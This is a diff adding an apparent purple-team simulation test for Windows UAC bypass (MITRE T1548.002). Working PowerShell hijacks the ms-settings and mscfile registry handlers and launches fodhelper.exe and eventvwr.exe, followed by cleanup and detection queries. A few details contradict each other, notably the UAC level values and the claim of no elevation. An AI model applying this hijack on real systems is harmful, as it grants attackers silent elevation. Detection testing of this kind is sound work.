@@ -1,0 +1,128 @@
+id: T1548.002_bypass_uac
+name: "Abuse Elevation Control Mechanism — Bypass User Account Control"
+mitre_technique: "T1548.002"
+mitre_tactic: "privilege_escalation"
+description: >
+  Adversaries bypass Windows User Account Control (UAC) to run processes at a
+  high integrity level without triggering a UAC prompt. UAC bypass techniques
+  abuse auto-elevation of trusted Windows binaries that run elevated without
+  prompting (auto-elevate COM objects, binary hijacking of trusted executables).
+  Classic techniques: fodhelper.exe registry hijack (HKCU\Software\Classes\ms-settings),
+  eventvwr.exe registry hijack (HKCU\Software\Classes\mscfile), sdclt.exe AppData
+  path hijacking, and DiskCleanup scheduled task abuse. All execute attacker
+  commands at high integrity without a UAC dialog appearing.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1548/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1548.002 — UAC Bypass simulation (registry hijack patterns only, no actual elevation)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Check current integrity level and UAC configuration"
+    command: |
+      Write-Host "[PAS] Current integrity level:"
+      $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
+      $pri = [Security.Principal.WindowsPrincipal]$id
+      $elevated = $pri.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+      Write-Host "  Running as admin: $elevated"
+
+      Add-Type @"
+      using System; using System.Runtime.InteropServices;
+      public class PASIntegrity {
+          [DllImport("advapi32.dll",SetLastError=true)]
+          public static extern bool GetTokenInformation(
+              IntPtr tok, int cls, IntPtr info, uint len, out uint retLen);
+          public const int TokenIntegrityLevel = 25;
+      }
+"@
+      Write-Host "[PAS] UAC configuration:"
+      $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+      $props  = Get-ItemProperty $uacKey -ErrorAction SilentlyContinue
+      Write-Host "  EnableLUA: $($props.EnableLUA)"
+      Write-Host "  ConsentPromptBehaviorAdmin: $($props.ConsentPromptBehaviorAdmin)"
+      Write-Host "  PromptOnSecureDesktop: $($props.PromptOnSecureDesktop)"
+      Write-Host "  UAC level 2 (default) = prompt for admin, 5 = always notify"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate fodhelper.exe UAC bypass — registry hijack pattern"
+    command: |
+      Write-Host "[PAS] fodhelper.exe UAC bypass pattern:"
+      Write-Host "[PAS] Technique: write to HKCU\Software\Classes\ms-settings\shell\open\command"
+      Write-Host "[PAS] fodhelper.exe reads this key and executes it elevated (auto-elevates)"
+
+      # Write the registry key (set to calc.exe — harmless, self-reversing)
+      $bypassKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+      New-Item -Path $bypassKey -Force | Out-Null
+      Set-ItemProperty -Path $bypassKey -Name "(Default)" -Value "cmd.exe /c echo PAS-UAC-BYPASS-FODHELPER"
+      Set-ItemProperty -Path $bypassKey -Name "DelegateExecute" -Value ""
+      Write-Host "[PAS] Registry key written: $bypassKey"
+
+      # Trigger fodhelper — generates the process launch telemetry
+      $proc = Start-Process fodhelper.exe -PassThru -ErrorAction SilentlyContinue
+      Start-Sleep -Milliseconds 800
+      if ($proc -and -not $proc.HasExited) {
+          $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+      }
+      Write-Host "[PAS] fodhelper.exe launched — UAC bypass telemetry generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate eventvwr.exe UAC bypass — mscfile hijack"
+    command: |
+      Write-Host "[PAS] eventvwr.exe UAC bypass pattern:"
+      $mscKey = "HKCU:\Software\Classes\mscfile\shell\open\command"
+      New-Item -Path $mscKey -Force | Out-Null
+      Set-ItemProperty -Path $mscKey -Name "(Default)" -Value "cmd.exe /c echo PAS-UAC-BYPASS-EVENTVWR"
+      Write-Host "[PAS] HKCU mscfile handler hijacked"
+
+      $proc2 = Start-Process eventvwr.exe -PassThru -ErrorAction SilentlyContinue
+      Start-Sleep -Milliseconds 600
+      if ($proc2 -and -not $proc2.HasExited) {
+          $proc2 | Stop-Process -Force -ErrorAction SilentlyContinue
+      }
+      Write-Host "[PAS] eventvwr.exe launched — HKCU mscfile bypass telemetry generated"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HKCU\\Software\\Classes registry write + fodhelper.exe/eventvwr.exe launch, process integrity elevation"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove UAC bypass registry keys"
+    command: |
+      Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "HKCU:\Software\Classes\mscfile"      -Recurse -Force -ErrorAction SilentlyContinue
+      Get-Process fodhelper,eventvwr -ErrorAction SilentlyContinue |
+          Stop-Process -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] UAC bypass registry keys removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1548.002 cleanup complete"
+
+analyst_checklist:
+  - "Registry write: HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command by user process"
+  - "Registry write: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command by user process"
+  - "Process: fodhelper.exe or eventvwr.exe spawning unexpected child processes"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'HKCU\\\\Software\\\\Classes\\\\ms-settings' and ActionType == 'RegistryValueSet'"
+  - "Sentinel: DeviceProcessEvents | where FileName in ('fodhelper.exe','eventvwr.exe') and InitiatingProcessFileName == 'powershell.exe'"
+  - "MDE alert: 'UAC bypass via registry key hijack' — built-in high-severity alert"
+  - "CONTROL CHECK: Set UAC to 'Always Notify' (ConsentPromptBehaviorAdmin=2) — prevents auto-elevation of trusted binaries"
+  - "CONTROL CHECK: ASR rule 'Block credential stealing from Windows LSASS' combined with integrity monitoring"
+  - "CONTROL CHECK: Standard user accounts — UAC bypass requires the user to be a local admin member; least-privilege limits exposure"
